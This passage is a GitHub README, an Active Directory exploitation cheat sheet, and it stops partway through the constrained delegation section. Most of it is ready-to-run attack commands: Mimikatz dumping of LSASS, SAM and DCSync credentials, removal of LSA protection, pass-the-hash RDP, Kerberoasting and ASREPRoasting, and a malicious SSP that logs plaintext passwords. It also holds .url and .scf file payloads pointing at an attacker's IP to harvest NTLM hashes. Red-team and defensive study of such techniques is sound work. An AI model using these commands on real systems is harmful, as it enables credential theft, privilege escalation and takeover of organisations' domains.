{"source": "github", "repo": "S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet", "file": "README.md", "url": "https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md", "content": "# Active Directory Exploitation Cheat Sheet\n\nThis cheat sheet contains common enumeration and attack methods for Windows Active Directory.\n\nThis cheat sheet is inspired by the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) repo.\n\n![Just Walking The Dog](https://github.com/buftas/Active-Directory-Exploitation-Cheatsheet/blob/master/WalkTheDog.png)\n\n## Summary\n\n- [Active Directory Exploitation Cheat Sheet](#active-directory-exploitation-cheat-sheet)\n  - [Summary](#summary)\n  - [Tools](#tools)\n  - [Domain Enumeration](#domain-enumeration)\n    - [Using PowerView](#using-powerview)\n    - [Using AD Module](#using-ad-module)\n    - [Using BloodHound](#using-bloodhound)\n      - [Remote BloodHound](#remote-bloodhound)\n      - [On Site BloodHound](#on-site-bloodhound)\n    - [Using Adalanche](#using-adalanche)\n      - [Remote adalanche](#remote-adalanche)\n    - [Export Enumerated Objects](#export-enumerated-objects)\n    - [Useful Enumeration Tools](#useful-enumeration-tools)\n  - [Local Privilege Escalation](#local-privilege-escalation)\n    - [Useful Local Priv Esc Tools](#useful-local-priv-esc-tools)\n  - [Lateral Movement](#lateral-movement)\n    - [Powershell Remoting](#powershell-remoting)\n    - [Remote Code Execution with PS Credentials](#remote-code-execution-with-ps-credentials)\n    - [Import a PowerShell Module and Execute its Functions Remotely](#import-a-powershell-module-and-execute-its-functions-remotely)\n    - [Executing Remote Stateful commands](#executing-remote-stateful-commands)\n    - [Mimikatz](#mimikatz)\n    - [Remote Desktop Protocol](#remote-desktop-protocol)\n    - [URL File Attacks](#url-file-attacks)\n    - [Useful Tools](#useful-tools)\n  - [Domain Privilege Escalation](#domain-privilege-escalation)\n    - [Kerberoast](#kerberoast)\n    - [ASREPRoast](#asreproast)\n    - [Password Spray Attack](#password-spray-attack)\n    - [Force Set SPN](#force-set-spn)\n    - [Abusing Shadow Copies](#abusing-shadow-copies)\n    - [List and Decrypt Stored Credentials using Mimikatz](#list-and-decrypt-stored-credentials-using-mimikatz)\n    - [Unconstrained Delegation](#unconstrained-delegation)\n    - [Constrained Delegation](#constrained-delegation)\n    - [Resource Based Constrained Delegation](#resource-based-constrained-delegation)\n    - [DNSAdmins Abuse](#dnsadmins-abuse)\n    - [Abusing Active Directory-Integraded DNS](#abusing-active-directory-integraded-dns)\n    - [Abusing Backup Operators Group](#abusing-backup-operators-group)\n    - [Abusing Exchange](#abusing-exchange)\n    - [Weaponizing Printer Bug](#weaponizing-printer-bug)\n    - [Abusing ACLs](#abusing-acls)\n    - [Abusing IPv6 with mitm6](#abusing-ipv6-with-mitm6)\n    - [SID History Abuse](#sid-history-abuse)\n    - [Exploiting SharePoint](#exploiting-sharepoint)\n    - [Zerologon](#zerologon)\n    - [PrintNightmare](#printnightmare)\n    - [Active Directory Certificate Services](#active-directory-certificate-services)\n    - [No PAC](#no-pac)\n  - [Domain Persistence](#domain-persistence)\n    - [Golden Ticket Attack](#golden-ticket-attack)\n    - [DCsync Attack](#dcsync-attack)\n    - [Silver Ticket Attack](#silver-ticket-attack)\n    - [Skeleton Key Attack](#skeleton-key-attack)\n    - [DSRM Abuse](#dsrm-abuse)\n    - [Custom SSP](#custom-ssp)\n  - [Cross Forest Attacks](#cross-forest-attacks)\n    - [Trust Tickets](#trust-tickets)\n    - [Abuse MSSQL Servers](#abuse-mssql-servers)\n    - [Breaking Forest Trusts](#breaking-forest-trusts)\n\n## Tools\n\n- [Powersploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)\n- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)\n- [Powermad](https://github.com/Kevin-Robertson/Powermad)\n- [Impacket](https://github.com/SecureAuthCorp/impacket)\n- [Mimikatz](https://github.com/gentilkiwi/mimikatz)\n- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Compiled Version](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)\n- [BloodHound](https://github.com/BloodHoundAD/BloodHound)\n- [AD Module](https://github.com/samratashok/ADModule)\n- [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)\n- [Adalanche](https://github.com/lkarlslund/adalanche)\n\n## Domain Enumeration\n\n### Using PowerView\n\n[Powerview v.3.0](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)<br>\n[Powerview Wiki](https://powersploit.readthedocs.io/en/latest/)\n\n- **Get Current Domain:** `Get-Domain`\n- **Enumerate Other Domains:** `Get-Domain -Domain <DomainName>`\n- **Get Domain SID:** `Get-DomainSID`\n- **Get Domain Policy:**\n\n  ```powershell\n  Get-DomainPolicy\n\n  #Will show us the policy configurations of the Domain about system access or kerberos\n  Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess\n  Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy\n  ```\n\n- **Get Domain Controllers:**\n  ```powershell\n  Get-DomainController\n  Get-DomainController -Domain <DomainName>\n  ```\n- **Enumerate Domain Users:**\n\n  ```powershell\n  #Save all Domain Users to a file\n  Get-DomainUser | Out-File -FilePath .\\DomainUsers.txt\n\n  #Will return specific properties of a specific user\n  Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List\n\n  #Enumerate user logged on a machine\n  Get-NetLoggedon -ComputerName <ComputerName>\n\n  #Enumerate Session Information for a machine\n  Get-NetSession -ComputerName <ComputerName>\n\n  #Enumerate domain machines of the current/specified domain where specific users are logged into\n  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName\n  ```\n\n- **Enum Domain Computers:**\n\n  ```powershell\n  Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName\n\n  #Enumerate Live machines\n  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName\n  ```\n\n- **Enum Groups and Group Members:**\n\n  ```powershell\n  #Save all Domain Groups to a file:\n  Get-DomainGroup | Out-File -FilePath .\\DomainGroup.txt\n\n  #Return members of Specific Group (eg. Domain Admins & Enterprise Admins)\n  Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member\n  Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName\n\n  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine\n  Get-NetLocalGroup | Select-Object GroupName\n\n  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine\n  Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain\n\n  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences\n  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName\n  ```\n\n- **Enumerate Shares:**\n\n  ```powershell\n  #Enumerate Domain Shares\n  Find-DomainShare\n\n  #Enumerate Domain Shares the current user has access\n  Find-DomainShare -CheckShareAccess\n\n  #Enumerate \"Interesting\" Files on accessible shares\n  Find-InterestingDomainShareFile -Include *passwords*\n  ```\n\n- **Enum Group Policies:**\n\n  ```powershell\n  Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName\n\n  #Enumerate all GPOs to a specific computer\n  Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName\n\n  #Get users that are part of a Machine's local Admin group\n  Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>\n  ```\n\n- **Enum OUs:**\n  ```powershell\n  Get-DomainOU -Properties Name | Sort-Object -Property Name\n  ```\n- **Enum ACLs:**\n\n  ```powershell\n  # Returns the ACLs associated with the specified account\n  Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs\n\n  #Search for interesting ACEs\n  Find-InterestingDomainAcl -ResolveGUIDs\n\n  #Check the ACLs associated with a specified path (e.g smb share)\n  Get-PathAcl -Path \"\\\\Path\\Of\\A\\Share\"\n  ```\n\n- **Enum Domain Trust:**\n\n  ```powershell\n  Get-DomainTrust\n  Get-DomainTrust -Domain <DomainName>\n\n  #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds\n  Get-DomainTrustMapping\n  ```\n\n- **Enum Forest Trust:**\n\n  ```powershell\n  Get-ForestDomain\n  Get-ForestDomain -Forest <ForestName>\n\n  #Map the Trust of the Forest\n  Get-ForestTrust\n  Get-ForestTrust -Forest <ForestName>\n  ```\n\n- **User Hunting:**\n\n  ```powershell\n  #Finds all machines on the current domain where the current user has local admin access\n  Find-LocalAdminAccess -Verbose\n\n  #Find local admins on all machines of the domain\n  Find-DomainLocalGroupMember -Verbose\n\n  #Find computers were a Domain Admin OR a specified user has a session\n  Find-DomainUserLocation | Select-Object UserName, SessionFromName\n\n  #Confirming admin access\n  Test-AdminAccess\n  ```\n\n  :heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \\\n  I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him -> Profit!\n\n### Using AD Module\n\n- **Get Current Domain:** `Get-ADDomain`\n- **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`\n- **Get Domain SID:** `Get-DomainSID`\n- **Get Domain Controlers:**\n\n  ```powershell\n  Get-ADDomainController\n  Get-ADDomainController -Identity <DomainName>\n  ```\n\n- **Enumerate Domain Users:**\n\n  ```powershell\n  Get-ADUser -Filter * -Identity <user> -Properties *\n\n  #Get a specific \"string\" on a user's attribute\n  Get-ADUser -Filter 'Description -like \"*wtver*\"' -Properties Description | select Name, Description\n  ```\n\n- **Enum Domain Computers:**\n  ```powershell\n  Get-ADComputer -Filter * -Properties *\n  Get-ADGroup -Filter *\n  ```\n- **Enum Domain Trust:**\n  ```powershell\n  Get-ADTrust -Filter *\n  Get-ADTrust -Identity <DomainName>\n  ```\n- **Enum Forest Trust:**\n\n  ```powershell\n  Get-ADForest\n  Get-ADForest -Identity <ForestName>\n\n  #Domains of Forest Enumeration\n  (Get-ADForest).Domains\n  ```\n\n- **Enum Local AppLocker Effective Policy:**\n\n  ```powershell\n  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections\n  ```\n\n### Using BloodHound\n\n#### Remote BloodHound\n\n[Python BloodHound Repository](https://github.com/fox-it/BloodHound.py) or install it with `pip3 install bloodhound`\n\n```powershell\nbloodhound-python -u <UserName> -p <Password> -ns <Domain Controller's Ip> -d <Domain> -c All\n```\n\n#### On Site BloodHound\n\n```powershell\n#Using exe ingestor\n.\\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>\n\n#Using PowerShell module ingestor\n. .\\SharpHound.ps1\nInvoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>\n```\n\n### Using Adalanche\n\n#### Remote Adalanche\n\n```bash\n# kali linux:\n./adalanche collect activedirectory --domain <Domain> \\\n--username <Username@Domain> --password <Password> \\\n--server <DC>\n\n# Example:\n./adalanche collect activedirectory --domain windcorp.local \\\n--username spoNge369@windcorp.local --password 'password123!' \\\n--server dc.windcorp.htb\n## -> Terminating successfully\n\n## Any error?:\n\n# LDAP Result Code 200 \"Network Error\": x509: certificate signed by unknown authority ?\n\n./adalanche collect activedirectory --domain windcorp.local \\\n--username spoNge369@windcorp.local --password 'password123!' \\\n--server dc.windcorp.htb --tlsmode NoTLS --port 389\n\n# Invalid Credentials ?\n./adalanche collect activedirectory --domain windcorp.local \\\n--username spoNge369@windcorp.local --password 'password123!' \\\n--server dc.windcorp.htb --tlsmode NoTLS --port 389 \\\n--authmode basic\n\n# Analyze data \n# go to web browser -> 127.0.0.1:8080\n./adalanche analyze\n```\n\n#### Export Enumerated Objects\n\nYou can export enumerated objects from any module/cmdlet  into an XML file for later ananlysis.\n\nThe `Export-Clixml` cmdlet creates a Common Language Infrastructure (CLI) XML-based representation of an object or objects and stores it in a file. You can then use the `Import-Clixml` cmdlet to recreate the saved object based on the contents of that file.\n\n```powershell\n# Export Domain users to xml file.\nGet-DomainUser | Export-CliXml .\\DomainUsers.xml\n\n# Later, when you want to utilise them for analysis even on any other machine.\n$DomainUsers = Import-CliXml .\\DomainUsers.xml\n\n# You can now apply any condition, filters, etc.\n\n$DomainUsers | select name\n\n$DomainUsers | ? {$_.name -match \"User's Name\"}\n```\n\n### Useful Enumeration Tools\n\n- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) Information dumper via LDAP\n- [adidnsdump](https://github.com/dirkjanm/adidnsdump) Integrated DNS dumping by any authenticated user\n- [ACLight](https://github.com/cyberark/ACLight) Advanced Discovery of Privileged Accounts\n- [ADRecon](https://github.com/sense-of-security/ADRecon) Detailed Active Directory Recon Tool\n\n## Local Privilege Escalation\n\n- [Windows Local Privilege Escalation Cookbook](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook) Cookbook for Windows Local Privilege Escalations\n\n- [Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation\n\n  :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803\n\n- [Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) Automated Juicy Potato\n\n  :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803\n\n- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) Exploit the PrinterBug for System Impersonation\n\n  :pray: Works for Windows Server 2019 and Windows 10\n\n- [RoguePotato](https://github.com/antonioCoco/RoguePotato) Upgraded Juicy Potato\n\n  :pray: Works for Windows Server 2019 and Windows 10\n\n- [Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)\n- [SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/) \\\n  [PoC](https://github.com/danigargu/CVE-2020-0796)\n- [CVE-2021-36934 (HiveNightmare/SeriousSAM)](https://github.com/cube0x0/CVE-2021-36934)\n\n### Useful Local Priv Esc Tools\n\n- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse\n- [BeRoot](https://github.com/AlessandroZ/BeRoot) General Priv Esc Enumeration Tool\n- [Privesc](https://github.com/enjoiz/Privesc) General Priv Esc Enumeration Tool\n- [FullPowers](https://github.com/itm4n/FullPowers) Restore A Service Account's Privileges\n\n## Lateral Movement\n\n### PowerShell Remoting\n\n```powershell\n#Enable PowerShell Remoting on current Machine (Needs Admin Access)\nEnable-PSRemoting\n\n#Entering or Starting a new PSSession (Needs Admin Access)\n$sess = New-PSSession -ComputerName <Name>\nEnter-PSSession -ComputerName <Name> OR -Sessions <SessionName>\n```\n\n### Remote Code Execution with PS Credentials\n\n```powershell\n$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('htb.local\\<WtverUser>', $SecPassword)\nInvoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}\n```\n\n### Import a PowerShell Module and Execute its Functions Remotely\n\n```powershell\n#Execute the command and start a session\nInvoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\\FilePath\\file.ps1 -Session $sess\n\n#Interact with the session\nEnter-PSSession -Session $sess\n\n```\n\n### Executing Remote Stateful commands\n\n```powershell\n#Create a new session\n$sess = New-PSSession -ComputerName <NameOfComputer>\n\n#Execute command on the session\nInvoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}\n\n#Check the result of the command to confirm we have an interactive session\nInvoke-Command -Session $sess -ScriptBlock {$ps}\n```\n\n### Mimikatz\n\n```powershell\n#The commands are in cobalt strike format!\n\n#Dump LSASS:\nmimikatz privilege::debug\nmimikatz token::elevate\nmimikatz sekurlsa::logonpasswords\n\n#(Over) Pass The Hash\nmimikatz privilege::debug\nmimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>\n\n#List all available kerberos tickets in memory\nmimikatz sekurlsa::tickets\n\n#Dump local Terminal Services credentials\nmimikatz sekurlsa::tspkg\n\n#Dump and save LSASS in a file\nmimikatz sekurlsa::minidump c:\\temp\\lsass.dmp\n\n#List cached MasterKeys\nmimikatz sekurlsa::dpapi\n\n#List local Kerberos AES Keys\nmimikatz sekurlsa::ekeys\n\n#Dump SAM Database\nmimikatz lsadump::sam\n\n#Dump SECRETS Database\nmimikatz lsadump::secrets\n\n#Inject and dump the Domain Controler's Credentials\nmimikatz privilege::debug\nmimikatz token::elevate\nmimikatz lsadump::lsa /inject\n\n#Dump the Domain's Credentials without touching DC's LSASS and also remotely\nmimikatz lsadump::dcsync /domain:<DomainFQDN> /all\n\n#Dump old passwords and NTLM hashes of a user\nmimikatz lsadump::dcsync /user:<DomainFQDN>\\<user> /history\n\n#List and Dump local kerberos credentials\nmimikatz kerberos::list /dump\n\n#Pass The Ticket\nmimikatz kerberos::ptt <PathToKirbiFile>\n\n#List TS/RDP sessions\nmimikatz ts::sessions\n\n#List Vault credentials\nmimikatz vault::list\n```\n\n:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?\n\n- LSA as a Protected Process (Kernel Land Bypass)\n\n  ```powershell\n  #Check if LSA runs as a protected process by looking if the variable \"RunAsPPL\" is set to 0x1\n  reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\n\n  #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe\n  #Now lets import the mimidriver.sys to the system\n  mimikatz # !+\n\n  #Now lets remove the protection flags from lsass.exe process\n  mimikatz # !processprotect /process:lsass.exe /remove\n\n  #Finally run the logonpasswords function to dump lsass\n  mimikatz # sekurlsa::logonpasswords\n  ```\n\n- LSA as a Protected Process (Userland \"Fileless\" Bypass)\n\n  - [PPLdump](https://github.com/itm4n/PPLdump)\n  - [Bypassing LSA Protection in Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)\n\n- LSA is running as virtualized process (LSAISO) by Credential Guard\n\n  ```powershell\n  #Check if a process called lsaiso.exe exists on the running processes\n  tasklist |findstr lsaiso\n\n  #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.\n  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides\n  mimikatz # misc::memssp\n\n  #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\\windows\\system32\\mimilsa.log\n  ```\n\n- [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)\n- [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)\n\n### Remote Desktop Protocol\n\nIf the host we want to lateral move to has \"RestrictedAdmin\" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.\n\n- Mimikatz:\n\n  ```powershell\n  #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the \"/restrictedadmin\" flag\n  privilege::debug\n  sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:\"mstsc.exe /restrictedadmin\"\n\n  #Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated\n  ```\n\n- xFreeRDP:\n\n```powershell\nxfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>\n```\n\n:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin\".\n\n- Bypass \"Single Session per User\" Restriction\n\nOn a domain computer, if you have command execution as the system or local administrator and want an RDP session that another user is already using, you can get around the single session restriction by adding the following registry key:\n```powershell\nREG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v fSingleSessionPerUser /t REG_DWORD /d 0\n```\n\nOnce you've completed the desired stuff, you can delete the key to reinstate the single-session-per-user restriction.\n```powershell\nREG DELETE \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v fSingleSessionPerUse\n```\n\n\n### URL File Attacks\n\n- .url file\n\n  ```\n  [InternetShortcut]\n  URL=whatever\n  WorkingDirectory=whatever\n  IconFile=\\\\<AttackersIp>\\%USERNAME%.icon\n  IconIndex=1\n  ```\n\n  ```\n  [InternetShortcut]\n  URL=file://<AttackersIp>/leak/leak.html\n  ```\n\n- .scf file\n\n  ```\n  [Shell]\n  Command=2\n  IconFile=\\\\<AttackersIp>\\Share\\test.ico\n  [Taskbar]\n  Command=ToggleDesktop\n  ```\n\nPutting these files in a writeable share the victim only has to open the file explorer and navigate to the share. **Note** that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use responder to capture the hashes.\n\n:exclamation: .scf file attacks won't work on the latest versions of Windows.\n\n### Useful Tools\n\n- [Powercat](https://github.com/besimorhino/powercat) netcat written in powershell, and provides tunneling, relay and portforward\n  capabilities.\n- [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) fileless lateral movement tool that relies on ChangeServiceConfigA to run command\n- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) the ultimate WinRM shell for hacking/pentesting\n- [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp and open version of windows builtin runas.exe\n- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) creates all possible file formats for url file attacks\n\n## Domain Privilege Escalation\n\n### Kerberoast\n\n_WUT IS DIS?:_ \\\n All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a \"user\"  \n account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.\n\n- PowerView:\n\n  ```powershell\n  #Get User Accounts that are used as Service Accounts\n  Get-NetUser -SPN\n\n  #Get every available SPN account, request a TGS and dump its hash\n  Invoke-Kerberoast\n\n  #Requesting the TGS for a single account:\n  Request-SPNTicket\n\n  #Export all tickets using Mimikatz\n  Invoke-Mimikatz -Command '\"kerberos::list /export\"'\n  ```\n\n- AD Module:\n\n  ```powershell\n  #Get User Accounts that are used as Service Accounts\n  Get-ADUser -Filter {ServicePrincipalName -ne \"$null\"} -Properties ServicePrincipalName\n  ```\n\n- Impacket:\n\n  ```powershell\n  python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>\n  ```\n\n- Rubeus:\n\n  ```powershell\n  #Kerberoasting and outputing on a file with a specific format\n  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>\n\n  #Kerberoasting whle being \"OPSEC\" safe, essentially while not try to roast AES enabled accounts\n  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec\n\n  #Kerberoast AES enabled accounts\n  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes\n\n  #Kerberoast specific user account\n  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple\n\n  #Kerberoast by specifying the authentication credentials\n  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>\n  ```\n\n### ASREPRoast\n\n_WUT IS DIS?:_ \\\n If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted  \n blob and bruteforce it offline.\n\n- PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`\n- AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`\n\nForcefully Disable Kerberos Preauth on an account i have Write Permissions or more!\nCheck for interesting permissions on accounts:\n\n**Hint:** We add a filter e.g. RDPUsers to get \"User Accounts\" not Machine Accounts, because Machine Account hashes are not crackable!\n\nPowerView:\n\n```powershell\nInvoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \"RDPUsers\"}\nDisable Kerberos Preauth:\nSet-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose\nCheck if the value changed:\nGet-DomainUser -PreauthNotRequired -Verbose\n```\n\n- And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.\n\n  ```powershell\n  #Get a specific Accounts hash:\n  Get-ASREPHash -UserName <UserName> -Verbose\n\n  #Get any ASREPRoastable Users hashes:\n  Invoke-ASREPRoast -Verbose\n  ```\n\n- Using Rubeus:\n\n  ```powershell\n  #Trying the attack for all domain users\n  Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>\n\n  #ASREPRoast specific user\n  Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>\n\n  #ASREPRoast users of a specific OU (Organization Unit)\n  Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>\n  ```\n\n- Using Impacket:\n\n  ```powershell\n  #Trying the attack for the specified users on the file\n  python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>\n  ```\n\n### Password Spray Attack\n\nIf we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse\non other domain accounts.\n\n**Tools:**\n\n- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)\n- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)\n- [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)\n- [Spray](https://github.com/Greenwolf/Spray)\n\n### Force Set SPN\n\n_WUT IS DIS ?:\nIf we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it._\n\n- PowerView:\n\n  ```powershell\n  #Check for interesting permissions on accounts:\n  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \"RDPUsers\"}\n\n  #Check if current user has already an SPN setted:\n  Get-DomainUser -Identity <UserName> | select serviceprincipalname\n\n  #Force set the SPN on the account:\n  Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}\n  ```\n\n- AD Module:\n\n  ```powershell\n  #Check if current user has already an SPN setted\n  Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName\n\n  #Force set the SPN on the account:\n  Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}\n  ```\n\nFinally use any tool from before to grab the hash and kerberoast it!\n\n### Abusing Shadow Copies\n\nIf you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.\n\n```powershell\n#List shadow copies using vssadmin (Needs Admnistrator Access)\nvssadmin list shadows\n\n#List shadow copies using diskshadow\ndiskshadow list shadows all\n\n#Make a symlink to the shadow copy and access it\nmklink /d c:\\shadowcopy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\\n```\n\n1. You can dump the backuped SAM database and harvest credentials.\n2. Look for DPAPI stored creds and decrypt them.\n3. Access backuped sensitive files.\n\n### List and Decrypt Stored Credentials using Mimikatz\n\nUsually encrypted credentials are stored in:\n\n- `%appdata%\\Microsoft\\Credentials`\n- `%localappdata%\\Microsoft\\Credentials`\n\n```powershell\n#By using the cred function of mimikatz we can enumerate the cred object and get information about it:\ndpapi::cred /in:\"%appdata%\\Microsoft\\Credentials\\<CredHash>\"\n\n#From the previous command we are interested to the \"guidMasterKey\" parameter, that tells us which masterkey was used to encrypt the credential\n#Lets enumerate the Master Key:\ndpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\<usersid>\\<MasterKeyGUID>\"\n\n#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:\ndpapi::masterkey /in:\"%appdata%\\Microsoft\\Protect\\<usersid>\\<MasterKeyGUID>\" /rpc\n\n#We now have the masterkey in our local cache:\ndpapi::cache\n\n#Finally we can decrypt the credential using the cached masterkey:\ndpapi::cred /in:\"%appdata%\\Microsoft\\Credentials\\<CredHash>\"\n```\n\nDetailed Article:\n[DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)\n\n### Unconstrained Delegation\n\n_WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a\nhigh value target or DA to connect to it, steal his TGT then ptt and impersonate him!_\n\nUsing PowerView:\n\n```powershell\n#Discover domain joined computers that have Unconstrained Delegation enabled\nGet-NetComputer -UnConstrained\n\n#List tickets and check if a DA or some High Value target has stored its TGT\nInvoke-Mimikatz -Command '\"sekurlsa::tickets\"'\n\n#Command to monitor any incoming sessions on our compromised server\nInvoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeOfMonitoringInSeconds> -UserName <UserToMonitorFor> -Delay\n<WaitInterval> -Verbose\n\n#Dump the tickets to disk:\nInvoke-Mimikatz -Command '\"sekurlsa::tickets /export\"'\n\n#Impersonate the user using ptt attack:\nInvoke-Mimikatz -Command '\"kerberos::ptt <PathToTicket>\"'\n```\n\n**Note:** We can also use Rubeus!\n\n### Constrained Delegation\n\nUsing PowerView and Kekeo:\n\n```powershell\n#Enumerate Users and Computers with constrained delegation\nGet-DomainUser -TrustedToAuth\nGet-DomainComputer -TrustedToAuth\n\n#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo\ntgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>\n\n#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation\ntgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain's FQDN> /service:<Service's 